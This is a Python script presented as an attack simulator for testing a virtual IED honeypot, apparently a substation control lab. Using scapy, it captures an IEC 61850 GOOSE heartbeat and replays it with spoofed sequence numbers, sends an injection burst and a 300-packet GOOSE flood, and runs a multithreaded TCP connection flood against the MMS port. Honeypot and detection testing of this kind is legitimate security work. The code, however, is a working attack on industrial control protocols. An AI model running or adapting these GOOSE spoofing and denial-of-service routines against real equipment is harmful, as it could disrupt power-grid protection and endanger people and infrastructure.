#!/usr/bin/env python3
import time
import socket
import threading
from scapy.all import *

TARGET_IP = "10.0.0.2" # IP of IED1_XCBR
TARGET_MAC = "01:0c:cd:01:00:02" # MAC IED1 subscribes to
IFACE = "eth0"

def test_mms_unauthorized_write():
    print("[*] Running Test A12: MMS Unauthorized Write...")
    print("[-] To test MMS Unauthorized Writes, open the web client (http://localhost:5000),")
    print("[-] navigate to IED1_XCBR and change any SP (Setpoint) or CF parameter, e.g. Mod.stVal.")
    print("[-] It will be logged as UNAUTHORIZED_ATTACK because your IP != 192.168.1.10.")

def capture_valid_goose():
    print("[*] Sniffing network for a valid GOOSE heartbeat from IED2...")
    pkts = sniff(iface=IFACE, filter=f"ether proto 0x88b8 and ether dst {TARGET_MAC}", count=1, timeout=15)
    if not pkts:
        print("[!] Could not capture GOOSE packet. Ensure IED2 is running.")
        return None
    print("[+] Captured valid GOOSE heartbeat to use as template!")
    return pkts[0]

def update_goose_sqnum(pkt, sqNum_diff=0, set_sqNum=None):
    b = bytearray(raw(pkt))
    # Keep stNum exactly identical to the heartbeat so honeypot thinks it's the same stream
    idx_sq = b.find(b'\x87\x01')
    if idx_sq != -1:
        if set_sqNum is not None:
            b[idx_sq+2] = set_sqNum & 0xff
        else:
            orig = b[idx_sq+2]
            b[idx_sq+2] = (orig + sqNum_diff) & 0xff
    return Ether(bytes(b))

def test_goose_replay(template_pkt):
    print("[*] Running Test A24: GOOSE Replay & stNum Spoofing...")
    # Send a packet with an older sqNum (e.g., origin - 5)
    pkt_replay = update_goose_sqnum(template_pkt, sqNum_diff=-5)
    sendp(pkt_replay, iface=IFACE, verbose=False)
    print("[-] Sent GOOSE Replay packet.")

def test_goose_injection_flood(template_pkt):
    print("[*] Running Test A23: GOOSE Injection Flood (< 10ms delta)...")
    # Send packets extremely fast with identical stNum and increasing sqNum
    pkts = [update_goose_sqnum(template_pkt, sqNum_diff=(i+1)) for i in range(5)]
    for pkt in pkts:
        sendp(pkt, iface=IFACE, verbose=False)
    print("[-] Sent GOOSE Injection burst.")

def test_dos_goose(template_pkt):
    print("[*] Running Test A31-A32: GOOSE DoS Flood...")
    # Spam GOOSE to trigger GOOSE DoS limit
    pkts = [update_goose_sqnum(template_pkt, set_sqNum=(i%255)) for i in range(300)]
    for pkt in pkts:
        sendp(pkt, iface=IFACE, verbose=False)
    print("[-] Sent GOOSE DoS Flood.")

def test_dos_mms():
    print("[*] Running Test A33-A36: MMS/TCP DoS (Flood)...")
    def worker():
        for _ in range(80): 
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)
                s.connect((TARGET_IP, 102))
                s.close()
            except:
                pass
    threads = []
    for _ in range(40):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print("[-] Sent MMS TCP Connection Flood.")

if __name__ == "__main__":
    print(f"=== Starting vIED Honeypot Attack Simulator (Target: {TARGET_IP}) ===")
    
    test_mms_unauthorized_write()
    time.sleep(1)
    
    template = capture_valid_goose()
    if template:
        test_goose_replay(template)
        time.sleep(1)
        test_goose_injection_flood(template)
        time.sleep(1)
        test_dos_goose(template)
        time.sleep(1)
    
    test_dos_mms()
    print("\n[+] All tests completed.")
